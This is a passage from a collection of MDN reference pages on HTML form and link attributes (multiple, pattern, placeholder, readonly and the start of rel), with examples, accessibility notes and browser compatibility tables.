data](https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending_and_retrieving_form_data#the_method_attribute) for more information.\n\n### select\n\nThe `multiple` attribute on the [`<select>`](../element/select) element represents a control for selecting zero or more options from the list of options. Otherwise, the [`<select>`](../element/select) element represents a control for selecting a single [`<option>`](../element/option) from the list of options. The control generally has a different appearance based on the presence of the multiple attribute, with most browsers displaying a scrolling list box instead of a single line dropdown when the attribute is present.\n\nhtml\n\n```\n<form method=\"get\" action=\"#\">\n  <p>\n    <label for=\"dwarfs\">Select the dwarf woodsman you like:</label>\n    <select multiple name=\"dwarfs\" id=\"dwarfs\">\n      <option>grumpy@woodworkers.com</option>\n      <option>happy@woodworkers.com</option>\n      <option>sleepy@woodworkers.com</option>\n      <option>bashful@woodworkers.com</option>\n      <option>sneezy@woodworkers.com</option>\n      <option>dopey@woodworkers.com</option>\n      <option>doc@woodworkers.com</option>\n    </select>\n  </p>\n  <p>\n    <label for=\"favoriteOnly\">Select your favorite:</label>\n    <select name=\"favoriteOnly\" id=\"favoriteOnly\">\n      <option>grumpy@woodworkers.com</option>\n      <option>happy@woodworkers.com</option>\n      <option>sleepy@woodworkers.com</option>\n      <option>bashful@woodworkers.com</option>\n      <option>sneezy@woodworkers.com</option>\n      <option>dopey@woodworkers.com</option>\n      <option>doc@woodworkers.com</option>\n    </select>\n  </p>\n  <p>\n    <input type=\"submit\" value=\"Submit\" />\n  </p>\n</form>\n```\n\nNote the difference in appearance between the two form controls.\n\ncss\n\n```\n/* uncomment this CSS to make the multiple the same height as the single */\n\n/*\nselect[multiple] {\n  height: 1.5em;\n  vertical-align: top;\n}\nselect[multiple]:focus,\nselect[multiple]:active {\n  height: auto;\n}\n*/\n```\n\nThere are a few ways to select multiple options in a `<select>` element with a `multiple` attribute. Depending on the operating system, mouse users can hold the Ctrl, Command, or Shift keys and then click multiple options to select/deselect them. Keyboard users can select multiple contiguous items by focusing on the `<select>` element, selecting an item at the top or bottom of the range they want to select using the Up and Down cursor keys to go up and down the options. The selection of non-contiguous is not as well-supported: items should be able to be selected and deselected by pressing Space, but support varies between browsers.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `multiple` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `multiple` | 2       | 12   | 3.6     | ≤12.1 | 4      | 18             | 4                   | ≤12.1         | 3.2           | 1.0              | ≤37             |     |\n\n### html.elements.input.multiple\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.select.multiple\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`<input>`](../element/input)\n- [`<select>`](../element/select)\n- [Allowing multiple email addresses](../element/input/email#allowing_multiple_email_addresses)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/multiple](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/multiple)"
- name: Attributes.pattern
  summary: The pattern attribute specifies a regular expression the form control's value should match
  description: "# HTML attribute: pattern\n\nThe `pattern` attribute specifies a [regular expression](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions) the form control's value should match. If a non-`null` value doesn't conform to the constraints set by the `pattern` value, the [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState) object's read-only [`patternMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/patternMismatch) property will be true.\n\n## Try it\n\n#### HTML Demo: pattern\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"username\">Username: (3-16 characters)</label>\n    <input id=\"username\" name=\"username\" type=\"text\" value=\"Sasha\" pattern=\"\\w{3,16}\" required />\n\n    <label for=\"pin\">PIN: (4 digits)</label>\n    <input id=\"pin\" name=\"pin\" type=\"password\" pattern=\"\\d{4,4}\" required />\n\n    label {\n      display: block;\n      margin-top: 1em;\n    }\n\n    input:valid {\n      background-color: palegreen;\n    }\n\n    input:invalid {\n      background-color: lightpink;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Overview\n\nThe `pattern` attribute is an attribute of the [text](../element/input/text), [tel](../element/input/tel), [email](../element/input/email), [url](../element/input/url), [password](../element/input/password), and [search](../element/input/search) input types.\n\nThe `pattern` attribute, when specified, is a regular expression which the input's [`value`](../element/input#value) must match for the value to pass [constraint validation](../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions).\n\nThe pattern's regular expression is compiled with the [`'v'` flag](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Character_class#v-mode_character_class). This makes the regular expression [unicode-aware](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/unicode#unicode-aware_mode), and also changes how character classes are interpreted. This allows character class set intersection and subtraction operations, and in addition to `]` and `\\`, the following characters must be escaped using a `\\` backslash if they represent literal characters: `(`, `)`, `[`, `{`, `}`, `/`, `-`, `|`. Before mid-2023, the `'u'` flag was specified instead; If you're updating older code, [this document outlines the differences](https://github.com/tc39/proposal-regexp-v-flag#how-is-the-v-flag-different-from-the-u-flag).\n\nThe pattern's regular expression must match the entire input's `value`, rather than matching a substring - as if a `^(?:` were implied at the start of the pattern and `)$` at the end.\n\nNo forward slashes should be specified around the pattern text. No regular expression is applied if the attribute value is absent, an empty string, or invalid.\n\nSome of the input types supporting the pattern attribute, notably the [email](../element/input/email) and [url](../element/input/url) input types, have expected value syntaxes that must be matched. If the pattern attribute isn't present, and the value doesn't match the expected syntax for that value type, the [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState) object's read-only [`typeMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/typeMismatch) property will be true.\n\n### Constraint validation\n\nIf the input's value is not the empty string and the value does not match the entire regular expression, there is a constraint violation reported by the [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState) object's [`patternMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/patternMismatch) property being `true`.\n\n**Note:** If the `pattern` attribute is specified with no value, its value is implicitly the empty string. Thus, **any non-empty** input `value` will result in constraint violation.\n\n### Usability and accessibility considerations\n\nWhen including a `pattern`, provide a description of the pattern in visible text near the control. Additionally, include a [`title`](../element/input#title) attribute which gives a description of the pattern. User agents may use the title contents during constraint validation to tell the user that the pattern is not matched. Some browsers show a tooltip with title contents, improving usability for sighted users. Additionally, assistive technology may read the title aloud when the control gains focus, but this should not be relied upon for accessibility.\n\nOnly relying on the `title` attribute for the visual display of text content is discouraged, as many user agents do not expose the attribute in an accessible manner. Although some browsers show a tooltip when an element with a title is hovered, that leaves out keyboard-only and touch-only users. This is one of the several reasons you must include information informing users how to fill out the control to match the requirements.\n\nWhile `title`s are used by some browsers to populate error messaging, because browsers sometimes also show the title as text on hover, it therefore shows in non-error situations, so be careful not to word titles as if an error has occurred.\n\n## Examples\n\n### Matching a phone number\n\nGiven the following:\n\nhtml\n\n```\n<p>\n  <label>\n    Enter your phone number in the format (123) - 456 - 7890 (<input\n      name=\"tel1\"\n      type=\"tel\"\n      pattern=\"[0-9]{3}\"\n      placeholder=\"###\"\n      aria-label=\"3-digit area code\"\n      size=\"2\" />) -\n    <input\n      name=\"tel2\"\n      type=\"tel\"\n      pattern=\"[0-9]{3}\"\n      placeholder=\"###\"\n      aria-label=\"3-digit prefix\"\n      size=\"2\" />\n    -\n    <input\n      name=\"tel3\"\n      type=\"tel\"\n      pattern=\"[0-9]{4}\"\n      placeholder=\"####\"\n      aria-label=\"4-digit number\"\n      size=\"3\" />\n  </label>\n</p>\n```\n\nHere we have 3 sections for a north American phone number with an implicit label encompassing all three components of the phone number, expecting 3-digits, 3-digits and 4-digits respectively, as defined by the `pattern` attribute set on each.\n\nIf the values are too long or too short, or contain characters that aren't digits, the `patternMismatch` will be true. When `true`, the element matches the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS pseudo-classes.\n\ncss\n\n```\ninput:invalid {\n  border: red solid 3px;\n}\n```\n\nIf we had used [`minlength`](minlength) and [`maxlength`](maxlength) attributes instead, we may have seen [`validityState.tooLong`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooLong) or [`validityState.tooShort`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooShort) being true.\n\n### Specifying a pattern\n\nYou can use the [`pattern`](../element/input#pattern) attribute to specify a regular expression that the inputted value must match in order to be considered valid (see [Validating against a regular expression](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation#validating_against_a_regular_expression) for a simple crash course on using regular expressions to validate inputs).\n\nThe example below restricts the value to 4-8 characters and requires that it contain only lower-case letters.\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"uname\">Choose a username: </label>\n    <input\n      type=\"text\"\n      id=\"uname\"\n      name=\"name\"\n      required\n      size=\"45\"\n      pattern=\"[a-z]{4,8}\"\n      title=\"4 to 8 lowercase letters\" />\n    <span class=\"validity\"></span>\n    <p>Usernames must be lowercase and 4-8 characters in length.</p>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis renders like so:\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `pattern` | 4       | 12   | 4       | ≤12.1 | 5      | 18             | 4                   | ≤12.1         | 4             | 1.0              | ≤37             |     |\n\n## See also\n\n- [Constraint validation](../constraint_validation)\n- [Forms: Data form validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)\n- [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/pattern](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/pattern)"
- name: Attributes.placeholder
  summary: The placeholder attribute defines the text displayed in a form control when the control has no value
  description: "# HTML attribute: placeholder\n\nThe `placeholder` attribute defines the text displayed in a form control when the control has no value. The placeholder text should provide a brief hint to the user as to the expected type of data that should be entered into the control.\n\nEffective placeholder text includes a word or short phrase that hints at the expected data type, not an explanation or prompt. The placeholder must not be used instead of a [`<label>`](../element/label). As the placeholder is not visible if the value of the form control is not null, using `placeholder` instead of a `<label>` for a prompt harms usability and accessibility.\n\nThe `placeholder` attribute is supported by the following input types: [`text`](../element/input/text), [`search`](../element/input/search), [`url`](../element/input/url), [`tel`](../element/input/tel), [`email`](../element/input/email), and [`password`](../element/input/password). It is also supported by the [`<textarea>`](../element/textarea) element. The [example](#example) below shows the `placeholder` attribute in use to explain the expected format of an input field.\n\n**Note:** The `placeholder` attribute can't include any line feeds (LF) or carriage returns (CR). If either is included in the value, the placeholder text will be clipped.\n\n## Accessibility concerns\n\nPlaceholders should only be used to show an example of the type of data that should be entered into a form; never as a replacement for a `<label>` element; doing so harms accessibility and user experience.\n\nThe `<label>` text is visually and programmatically associated with its corresponding form control. Screen readers don't announce placeholder content by default, but they do announce label content; it's the label that informs assistive technology users what data should be entered in the control. Labels also improve user experience for users of pointing devices: When a user clicks, touches, or taps a `<label>`, focus is moved to the label's associated form control.\n\nPlaceholders can not be relied upon as a replacement for a label even for those not relying on assistive technology. Placeholder text is displayed at lower color contrast than the default form control text. This is by design, as you don't want users to be confused by what is placeholder text versus what is a filled-in form field. However, this lack of contrast can cause issues for low-vision users. Additionally, placeholder text disappears from form fields when users start entering text. If the placeholder text contains instructional information or examples that disappear, it can be confusing to users with cognitive issues and can make the form inaccessible if the placeholder contained the label.\n\n## Example\n\n### HTML\n\nhtml\n\n```\n<form action=\"/en-US/docs/Web/HTML/Attributes/placeholder\">\n  <label for=\"name\">Enter your name:</label>\n  <input type=\"text\" id=\"name\" name=\"name\" placeholder=\"e.g. Mike Shinoda\" />\n  <button type=\"submit\">Submit</button>\n</form>\n```\n\n### Result\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|               | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|               | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `placeholder` | 4       | 12   | 4       | ≤12.1 | 5      | 18             | 4                   | ≤12.1         | 5             | 1.0              | ≤37             |     |\n| `line_breaks` | 36      | 12   | 59      | 23    | No     | 36             | 59                  | 24            | No            | 3.0              | 37              |     |\n\n|               | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|               | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `placeholder` | 3       | 12   | 4       | ≤12.1 | 4      | 18             | 4                   | ≤12.1         | 3.2           | 1.0              | ≤37             |     |\n\n### html.elements.input.placeholder\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.textarea.placeholder\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- HTML [`title`](../global_attributes/title)\n- CSS [`:placeholder-shown`](https://developer.mozilla.org/en-US/docs/Web/CSS/:placeholder-shown) pseudo-class selector\n- CSS [`::placeholder`](https://developer.mozilla.org/en-US/docs/Web/CSS/::placeholder) pseudo-element selector\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/placeholder](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/placeholder)"
- name: Attributes.readonly
  summary: The Boolean readonly attribute, when present, makes the element not mutable, meaning the user can not edit the control
  description: "# HTML attribute: readonly\n\nThe Boolean `readonly` attribute, when present, makes the element not mutable, meaning the user can not edit the control.\n\n## Try it\n\n#### HTML Demo: readonly\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"firstName\">First Name:</label>\n    <input id=\"firstName\" name=\"firstName\" type=\"text\" value=\"Adam\" />\n\n    <label for=\"age\">Age:</label>\n    <input id=\"age\" name=\"age\" type=\"number\" value=\"42\" readonly />\n\n    <label for=\"hobbies\">Hobbies:</label>\n    <textarea id=\"hobbies\" name=\"hobbies\" readonly>Baseball</textarea>\n\n    label {\n      display: block;\n      margin-top: 1em;\n    }\n\n    input:read-only,\n    textarea:read-only {\n      background-color: silver;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Overview\n\nIf the `readonly` attribute is specified on an input element, because the user can not edit the input, the element does not participate in constraint validation.\n\nThe `readonly` attribute is supported by [`text`](../element/input/text), [`search`](../element/input/search), [`url`](../element/input/url), [`tel`](../element/input/tel), [`email`](../element/input/email), [`password`](../element/input/password), [`date`](../element/input/date), [`month`](../element/input/month), [`week`](../element/input/week), [`time`](../element/input/time), [`datetime-local`](../element/input/datetime-local), and [`number`](../element/input/number) [`<input>`](../element/input) types and the [`<textarea>`](../element/textarea) form control elements. If present on any of these input types and elements, the [`:read-only`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-only) pseudo class will match. If the attribute is not included, the [`:read-write`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-write) pseudo class will match.\n\nThe attribute is not supported or relevant to [`<select>`](../element/select) or input types that are already not mutable, such as [`checkbox`](../element/input/checkbox) and [`radio`](../element/input/radio) or cannot, by definition, start with a value, such as the [`file`](../element/input/file) input type. [`range`](../element/input/range) and [`color`](../element/input/color), as both have default values. It is also not supported on [`hidden`](../element/input/hidden) as it can not be expected that a user to fill out a form that is hidden. Nor is it supported on any of the button types, including `image`.\n\n**Note:** Only text controls can be made read-only, since for other controls (such as checkboxes and buttons) there is no useful distinction between being read-only and being disabled, so the `readonly` attribute does not apply.\n\nWhen an input has the `readonly` attribute, the [`:read-only`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-only) pseudo-class also applies to it. Conversely, inputs that support the `readonly` attribute but don't have the attribute set match the [`:read-write`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-write) pseudo-class.\n\n### Attribute interactions\n\nThe difference between [`disabled`](disabled) and `readonly` is that read-only controls can still function and are still focusable, whereas disabled controls can not receive focus and are not submitted with the form and generally do not function as controls until they are enabled.\n\nBecause a read-only field cannot have its value changed by a user interaction, [`required`](required) does not have any effect on inputs with the `readonly` attribute also specified.\n\nThe only way to modify dynamically the value of the readonly attribute is through a script.\n\n**Note:** The `required` attribute is not permitted on inputs with the `readonly` attribute specified.\n\n### Usability\n\nBrowsers display the `readonly` attribute.\n\n### Constraint validation\n\nIf the element is read-only, then the element's value can not be updated by the user, and does not participate in constraint validation.\n\n## Example\n\n### HTML\n\nhtml\n\n```\n<div class=\"group\">\n  <input type=\"text\" value=\"Some value\" readonly=\"readonly\" id=\"text\" />\n  <label for=\"text\">Text box</label>\n</div>\n<div class=\"group\">\n  <input type=\"date\" value=\"2020-01-01\" readonly=\"readonly\" id=\"date\" />\n  <label for=\"date\">Date</label>\n</div>\n<div class=\"group\">\n  <input type=\"email\" value=\"Some value\" readonly=\"readonly\" id=\"email\" />\n  <label for=\"email\">Email</label>\n</div>\n<div class=\"group\">\n  <input type=\"password\" value=\"Some value\" readonly=\"readonly\" id=\"pwd\" />\n  <label for=\"pwd\">Password</label>\n</div>\n<div class=\"group\">\n  <textarea readonly=\"readonly\" id=\"ta\">Some value</textarea>\n  <label for=\"ta\">Message</label>\n</div>\n```\n\n### Result\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `readonly` | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `readonly` | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n\n### html.elements.input.readonly\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.textarea.readonly\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`:read-only`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-only) and [`:read-write`](https://developer.mozilla.org/en-US/docs/Web/CSS/:read-write)\n- [`<input>`](../element/input)\n- [`<select>`](../element/select)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/readonly](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/readonly)"
- name: Attributes.rel
  summary: The rel attribute defines the relationship between a linked resource and the current document
  description: "# HTML attribute: rel\n\nThe `rel` attribute defines the relationship between a linked resource and the current document. Valid on [`<link>`](../element/link), [`<a>`](../element/a), [`<area>`](../element/area), and [`<form>`](../element/form), the supported values depend on the element on which the attribute is found.\n\nThe type of relationships is given by the value of the `rel` attribute, which, if present, must have a value that is an unordered set of unique space-separated keywords. Differently from a `class` name, which does not express semantics, the `rel` attribute must express tokens that are semantically valid for both machines and humans. The current registries for the possible values of the `rel` attribute are the [IANA link relation registry](https://www.iana.org/assignments/link-relations/link-relations.xhtml), the [HTML Living Standard](https://html.spec.whatwg.org/multipage/links.html#linkTypes), and the freely-editable [existing-rel-values page](https://microformats.org/wiki/existing-rel-values) in the microformats wiki, [as suggested](https://html.spec.whatwg.org/multipage/links.html#other-link-types) by the Living Standard. If a `rel` attribute not present in one of the three sources above is used some HTML validators (such as the [W3C Markup Validation Service](https://validator.w3.org/)) will generate a warning.\n\nThe following table lists some of the most important existing keywords. Every keyword within a space-separated value should be unique within that value.\n\n| `rel` value                             | Description                                                                                                                                                                                                                                                           | [`<link>`](../element/link) | [`<a>`](../element/a) and [`<area>`](../element/area) | [`<form>`](../element/form) |\n|-----------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------|-------------------------------------------------------|-----------------------------|\n| [`alternate`](#alternate)               | Alternate representations of the current document.                                                                                                                                                                                                                    | Link                        | Link                                                  | Not allowed                 |\n| [`author`](#author)                     | Author of the current document or article.                                                                                                                                                                                                                            | Link                        | Link                                                  | Not allowed                 |\n| [`bookmark`](#bookmark)                 | Permalink for the nearest ancestor section.                                                                                                                                                                                                                           | Not allowed                 | Link                                                  | Not allowed                 |\n| [`canonical`](#canonical)               | Preferred URL for the current document.                                                                                                                                                                                                                               | Link                        | Not allowed                                           | Not allowed                 |\n| [`dns-prefetch`](rel/dns-prefetch)      | Tells the browser to preemptively perform DNS resolution for the target resource's origin.                                                                                                                                                                            | External Resource           | Not allowed                                           | Not allowed                 |\n| [`external`](#external)                 | The referenced document is not part of the same site as the current document.                                                                                                                                                                                         | Not allowed                 | Annotation                                            | Annotation                  |\n| [`expect`](#expect)                     | Allows the page to be [render-blocked](https://developer.mozilla.org/en-US/docs/Glossary/Render_blocking) until the essential parts of the document are parsed so it will render consistently.                                                                        | Link                        | Not allowed                                           | Not allowed                 |\n| [`help`](#help)                         | Link to context-sensitive help.                                                                                                                                                                                                                                       | Link                        | Link                                                  | Link                        |\n| [`icon`](#icon)                         | An icon representing the current document.                                                                                                                                                                                                                            | External Resource           | Not allowed                                           | Not allowed                 |\n| [`license`](#license)                   | Indicates that the main content of the current document is covered by the copyright license described by the referenced document.                                                                                                                                     | Link                        | Link                                                  | Link                        |\n| [`manifest`](rel/manifest)              | Web app manifest.                                                                                                                                                                                                                                                     | Link                        | Not allowed                                           | Not allowed                 |\n| [`me`](rel/me)                          | Indicates that the current document represents the person who owns the linked content.                                                                                                                                                                                | Link                        | Link                                                  | Not allowed                 |\n| [`modulepreload`](rel/modulepreload)    | Tells to browser to preemptively fetch the script and store it in the document's module map for later evaluation. Optionally, the module's dependencies can be fetched as well.                                                                                       | External Resource           | Not allowed                                           | Not allowed                 |\n| [`next`](#next)                         | Indicates that the current document is a part of a series and that the next document in the series is the referenced document.                                                                                                                                        | Link                        | Link                                                  | Link                        |\n| [`nofollow`](#nofollow)                 | Indicates that the current document's original author or publisher does not endorse the referenced document.                                                                                                                                                          | Not allowed                 | Annotation                                            | Annotation                  |\n| [`noopener`](rel/noopener)              | Creates a top-level browsing context that is not an auxiliary browsing context if the hyperlink would create either of those, to begin with (i.e., has an appropriate `target` attribute value).                                                                      | Not allowed                 | Annotation                                            | Annotation                  |\n| [`noreferrer`](rel/noreferrer)          | No `Referer` header will be included. Additionally, has the same effect as `noopener`.                                                                                                                                                                                | Not allowed                 | Annotation                                            | Annotation                  |\n| [`opener`](#opener)                     | Creates an auxiliary browsing context if the hyperlink would otherwise create a top-level browsing context that is not an auxiliary browsing context (i.e., has \"`_blank`\" as `target` attribute value).                                                              | Not allowed                 | Annotation                                            | Annotation                  |\n| [`pingback`](#pingback)                 | Gives the address of the pingback server that handles pingbacks to the current document.                                                                                                                                                                              | External Resource           | Not allowed                                           | Not allowed                 |\n| [`preconnect`](rel/preconnect)          | Specifies that the user agent should preemptively connect to the target resource's origin.                                                                                                                                                                            | External Resource           | Not allowed                                           | Not allowed                 |\n| [`prefetch`](rel/prefetch)              | Specifies that the user agent should preemptively fetch and cache the target resource as it is likely to be required for a followup navigation.                                                                                                                       | External Resource           | Not allowed                                           | Not allowed                 |\n| [`preload`](rel/preload)                | Specifies that the user agent must preemptively fetch and cache the target resource for current navigation according to the potential destination given by the [`as`](../element/link#as) attribute (and the priority associated with the corresponding destination). | External Resource           | Not allowed                                           | Not allowed                 |\n| [`prerender`](rel/prerender)            | Specifies that the user agent should preemptively fetch the target resource and process it in a way that helps deliver a faster response in the future.                                                                                                               | External Resource           | Not allowed                                           | Not allowed                 |\n| [`prev`](#prev)                         | Indicates that the current document is a part of a series and that the previous document in the series is the referenced document.                                                                                                                                    | Link                        | Link                                                  | Link                        |\n| [`privacy-policy`](#privacy-policy)     | Gives a link to a information about the data collection and usage practices that apply to the current document.                                                                                                                                                       | Link                        | Link                                                  | Not allowed                 |\n| [`search`](#search)                     | Gives a link to a resource that can be used to search through the current document and its related pages.                                                                                                                                                             | Link                        | Link                                                  | Link                        |\n| [`stylesheet`](#stylesheet)             | Imports a style sheet.                                                                                                                                                                                                                                                | External Resource           | Not allowed                                           | Not allowed                 |\n| [`tag`](#tag)                           | Gives a tag (identified by the given address) that applies to the current document.                                                                                                                                                                                   | Not allowed                 | Link                                                  | Not allowed                 |\n| [`terms-of-service`](#terms-of-service) | Link to the agreement, or terms of service, between the document's provider and users who wish to use the document.                                                                                                                                                   | Link                        | Link                                                  | Not allowed                 |\n\nThe `rel` attribute is relevant to the [`<link>`](../element/link), [`<a>`](../element/a), [`<area>`](../element/area), and [`<form>`](../element/form) elements, but some values only relevant to a subset of those elements. Like all HTML keyword attribute values, these values are case-insensitive.\n\nThe `rel` attribute has no default value. If the attribute is omitted or if none of the values in the attribute are supported, then the document has no particular relationship with the destination resource other than there being a hyperlink between the two. In this case, on [`<link>`](../element/link) and [`<form>`](../element/form), if the `rel` attribute is absent, has no keywords, or if not one or more of the space-separated keywords above, then the element does not create any links. [`<a>`](../element/a) and [`<area>`](../element/area) will still created links, but without a defined relationship.\n\n## Values\n\n[`alternate`](#alternate)  \nIndicates an alternate representation of the current document. Valid for [`<link>`](../element/link), [`<a>`](../element/a), and [`<area>`](../element/area), the meaning depends on the values of the other attributes.\n\n- With the [`stylesheet`](#stylesheet) keyword on a `<link>`, it creates an [alternate stylesheet](https://developer.mozilla.org/en-US/docs/Web/CSS/Alternative_style_sheets).\n  html\n\n  ```\n  <!-- a persistent style sheet -->\n  <link rel=\"stylesheet\" href=\"default.css\" />\n  <!-- alternate style sheets -->\n  <link\n    rel=\"alternate stylesheet\"\n    href=\"highcontrast.css\"\n    title=\"High contrast\" />\n  ```\n- With an [`hreflang`](../element/link#hreflang) attribute that differs from the document language, it indicates a translation.\n- With the [`type`](../element/link#type) attribute value of `\"application/rss+xml\"` or `\"application/atom+xml\"`, it creates a hyperlink referencing a syndication feed.\n  html\n\n  ```\n  <link\n    rel=\"alternate\"\n    type=\"application/atom+xml\"\n    href=\"posts.xml\"\n    title=\"Blog\" />\n  ```\n- Otherwise, it creates a hyperlink referencing an alternate representation of the current document, whose nature is given by the [`hreflang`](../element/link#hreflang) and [`type`](../element/link#type) attributes.\n  - If `hreflang` is given alongside `alternate`, and the value of `hreflang` is different from the current document's language, it indicates that the referenced document is a translation.\n  - If `type` is given alongside `alternate`, it indicates that the referenced document is an alternative format (such as a PDF).\n  - The `hreflang` and `type` attributes may both be given alongside `alternate`.\n\n  html\n\n  ```\n  <link\n    rel=\"alternate\"\n    href=\"/fr/html/print\"\n    hreflang=\"fr\"\n    type=\"text/html\"\n    media=\"print\"\n    title=\"French HTML (for printing)\" />\n  <link\n    rel=\"alternate\"\n    href=\"/fr/pdf\"\n    hreflang=\"fr\"\n    type=\"application/pdf\"\n    title=\"French PDF\" />\n  ```\n\n[`author`](#author)  \nIndicates the referenced document provides further information about the author of the current document or article. Relevant for [`<link>`](../element/link), [`<a>`](../element/a), and [`<area>`](../element/area) elements.\n\nWith [`<a>`](../element/a) and [`<area>`](../element/area), it indicates the linked document (or `mailto:`) provides information about the author of the nearest [`<article>`](../element/article) ancestor if there is one, otherwise the entire document.\n\nWith [`<link>`](../element/link), it represents the author of the entire document.\n\n**Note:** For historical reasons, the obsolete attribute value `rev=\"made\"` is treated as `rel=\"author\"`.\n\n[`bookmark`](#bookmark)  \nRelevant as the 